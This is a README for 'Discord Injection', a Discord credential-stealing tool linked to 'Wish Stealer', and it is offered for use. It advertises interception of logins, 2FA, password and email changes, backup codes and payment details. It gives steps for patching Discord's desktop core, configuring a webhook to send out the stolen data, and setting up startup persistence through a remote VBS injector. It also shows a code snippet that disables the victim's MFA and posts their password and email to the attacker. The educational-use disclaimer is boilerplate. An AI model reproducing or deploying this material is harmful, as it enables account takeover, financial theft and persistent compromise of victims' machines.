[github-issues-link]: https://github.com/wishware/discord-injection-public/issues
[github-license-link]: https://github.com/wishware/discord-injection-public/blob/main/license
[github-stars-link]: https://github.com/wishware/discord-injection-public/stargazers
[github-forks-link]: https://github.com/wishware/discord-injection-public/network/members
[github-link]: https://github.com/wishware/discord-injection-public

<div align="center">

# [Discord Injection][github-link]

Interception of Discord HTTP Requests, Including Backup Code Retrieval and Deceptive User Alerts for Vulnerabilities, Among Other Techniques!

</div>

## Overview

Tool designed to showcase the interception of HTTP requests within the Discord application. This tool highlights potential vulnerabilities by capturing critical actions and interactions that occur within Discord.

## Features

- **Persistence:** Injection is irremovable and automatically reinjects on Discord startup if not present.
- **Forced Mail Change & Edit User:** Displays a fake security alert and modifies user data if configured.
- **Login & Authentication:** Intercepts login, registration, and two-factor (2FA) requests.
- **Account Management:** Captures email and password change requests.
- **Security Codes:** Obtains all of the victim's security codes.
- **Payment Information:** Monitors credit card and PayPal addition requests.
- **Security Measures:** Automatic logout after injection, prevents QR code login, and blocks device information requests.

## Installation Guide

1. You must close the Discord applications where you want to install this injection.
2. Copy the content of the injection in this way:

   - Download the [injection code](https://raw.githubusercontent.com/wishware/discord-injection-public/main/injection.js) and insert it into your Discord desktop core. Navigate to:
     ```bash
     %APPDATA%\Local\Discord\app-<app-version>\modules\discord_desktop_core-<core-version>\discord_desktop_core\index.js
     ```

3. Start with the basic injection settings:

   - `%WEBHOOK_URL%` - The injection must notify events to a Discord server via a Discord webhook
   - `%API_URL%` - Official API for Wish Stealer. This should be optional, but don't move it if you don't want to
   - `%AUTO_USER_PROFILE_EDIT%` - You can set a value of `true` or `false`. If you want it to work, use `true`
   - `%AUTO_EMAIL_UPDATE%` - You can set a value of `true` or `false`. If you want it to work, use `true`
   - Important this do not change it:
     ```json
     injection_url: "https://raw.githubusercontent.com/wishware/discord-injection-public/main/injection.js",
     injector_url: "https://raw.githubusercontent.com/wishware/discord-vbs-injector/main/injector.vbs",
     ```

4. Restart the Discord applications where I installed the injection to apply the changes to the app.

## Usage

1. Our main injector is Wish Stealer

   - For a more feature-rich injector based on Node.js, visit [Wish Stealer](https://github.com/r4lrgx/wish). It's a free tool with extensive capabilities.

## Startup

Once the victim is injected, several instances will be created on the PC in parallel, simply once the victim is trapped they will not be able to leave.

An autostart task is created on multiple routes as in

```Bash
%APPDATA%\Microsoft\Protect
```

```Bash
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
```

Firstly, the [Injector Malware](https://raw.githubusercontent.com/wishware/discord-vbs-injector/main/injector.vbs) will be stored here and will be executed whenever the PC starts.

## Preview

### Auto Mfa Disabler

```js
if (CONFIG.auto_mfa_disabler === 'true') {
 await delay(5000);

 const autoMfadisablerToken = await autoMfadisabler(response, token, 'backup');

 content = {
  content: `**${user.username}** mfa was deactivated automatically!`,
  embeds: [
   {
    fields: [
     { name: 'Password', value: `\`${password}\``, inline: true },
     { name: 'Email', value: `\`${email}\``, inline: true },
    ],
   },
  ],
 };

 notify(content, autoMfadisablerToken, user);
}
```

If you are interested in an improved version with more features such as auto mfa deactivator and premium options you can buy it

## Contributing

We welcome your contributions to this project! If you have suggestions or improvements, please feel free to open an issue or submit a pull request with your changes. Your involvement from the community is highly valued.

You can support the development of this project by making a donation, which helps bring new, optimized, and improved projects to life. Alternatively, you can simply add a star to this repository.

<a href="https://ko-fi.com/A0A11481X5" target="_blank">
  <img src="https://cdn.prod.website-files.com/5c14e387dab576fe667689cf/670f5a02fcf48af59c591185_support_me_on_kofi_dark.png" alt="ko-fi" width="210">
</a>
<br/>

Thank you for your interest and support! ✌️

## License

This software is licensed under the [MIT License](LICENSE).

## Disclaimer

### Important Notice: Educational Use Only.

This tool is designed solely for educational purposes. Any misuse of this tool is strictly prohibited. By using this tool, you acknowledge and accept these terms.

### User Accountability:

By utilizing this tool, you take full responsibility for your actions. The creator disclaims any liability for misuse. It is your responsibility to ensure that your use of this software complies with all applicable laws and regulations.

### No Assistance:

The creator will not provide assistance or support for any misuse of this tool. Any inquiries related to harmful or illegal activities will be ignored.

### Terms Acceptance:

By using this tool, you agree to abide by this disclaimer. If you do not agree with these terms, please do not use the software.
